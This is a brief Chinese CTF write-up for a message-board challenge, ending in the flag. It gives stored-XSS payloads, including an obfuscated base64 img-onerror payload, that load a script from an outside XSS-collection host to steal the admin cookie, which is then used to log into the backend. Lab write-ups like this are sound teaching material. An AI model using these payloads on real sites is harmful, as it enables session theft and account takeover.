flag:flag{5085a4df-4e6a-4da2-9a70-65ba448a6454}

----

一个留言板，尝试xss

```(空)
<sCRiPt sRC=//uj.ci/uou></sCrIpT>
...
测试
```

利用xss平台

```(空)
'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdWouY2kvdW91Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>
```



![image-20241218175420671](https://gitee.com/bx33661/image/raw/master/path/image-20241218175420671.png)

利用管理员的cookie登录

http://f69873ee-ce15-4fda-89eb-663530931e9a.node5.buuoj.cn:81/backend/admin.php

即可拿到flag